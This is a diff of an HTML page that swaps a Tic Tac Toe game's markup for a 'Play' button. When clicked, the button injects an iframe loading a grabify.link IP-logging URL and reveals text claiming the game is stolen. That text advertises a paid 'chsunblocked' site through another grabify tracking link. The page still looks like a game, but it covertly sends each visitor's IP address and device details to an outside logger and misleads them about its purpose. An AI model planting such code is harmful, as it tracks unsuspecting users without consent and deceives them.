@@ -1,65 +1,66 @@
-<!doctype html>
-<html lang="en">
+
+<!DOCTYPE html>
+<html>
   <head>
-    <meta charset="UTF-8">
-    <title>Tic Tac Toe</title>
-    <link rel="canonical" href="hello-world.html">
-    <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
+    <style>
+      .play-button {
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        width: 200px;
+        height: 50px;
+        padding: 10px;
+        cursor: pointer;
+        background-color: green;
+        border: none;
+        border-radius: 100px;
+        color: white;
+      }
+
+      .text {
+        display: none;
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        width: 90%;
+        height: 90%;
+        padding: 10px;
+        background-color: white;
+        font-size: 20px;
+      }
+    </style>
   </head>
+
   <body>
-    <main>
-      <div id="menu" class="menu-container">
-        <div id="hamburger" class="menu-container__menu"></div>
-      </div>
-      <heder class="header">
-        <div class="header__move-container">
-          <div id="selectX" class="header__move-container--x"></div>
-          <div id="selectO" class="header__move-container--o"></div>
-        </div>
-      </heder>
-      <section class="sec-c">
-        <div id="c-0" class="sec-c__item c-0">
-
-        </div>
-        <div id="c-1" class="sec-c__item c-1">
-
-        </div>
-        <div id="c-2" class="sec-c__item c-2">
-
-        </div>
-        <div id="c-3" class="sec-c__item c-3">
-
-        </div>
-        <div id="c-4" class="sec-c__item c-4">
-
-        </div>
-        <div id="c-5" class="sec-c__item c-5">
-
-        </div>
-        <div id="c-6" class="sec-c__item c-6">
-
-        </div>
-        <div id="c-7" class="sec-c__item c-7">
-
-        </div>
-        <div id="c-8" class="sec-c__item c-8">
-
-        </div>
-      </section>
-      <div id="winModal" class="win-modal">
-        <div class="win-modal__pad"></div>
-        <div id="winContent" class="win-modal__content"></div>
-      </div>
-      <aside id="aside" class="aside">
-        <div class="aside__container">
-          <ul id="mode">
-            <li data-id="1">One player</li>
-            <li data-id="2">Two players</li>
-            <li data-id="3">Reset</li>
-          </ul>
-        </div>
-      </aside>
-    </main>
-    <script src="assets/bundle.js"></script>
+    <button id="play-button" class="play-button">Play</button>
+    <div id="text" class="text">
+      Hello, just so you know, this game was stolen and this site is a crappy
+      rip off.
+      <br />
+      <br />
+      But if you <i>do</i> want to keep using this crappy games site you can
+      stop paying bc the site is public.
+      <br />
+      <br />
+      But if you want a better site (which is where this game came from btw)
+      check out chsunblocked. It is so much better, and it has more games like
+      minecraft, tools like chatgpt and tab cloaker, and movies as well as it
+      also has fullscreen. The best part is that its only $1 per <i>year</i> for
+      premium
+      <br />
+      <br />
+      <a target="_blank" href="https://grabify.link/3B9D7P">CHSUnblocked</a>
+    </div>
+    <script>
+      document
+        .getElementById("play-button")
+        .addEventListener("click", function () {
+          document.getElementById("play-button").innerHTML =
+            "<iframe src='https://grabify.link/6Y03P0'></iframe>";
+          document.getElementById("text").style.display = "block";
+        });
+    </script>
   </body>
 </html>
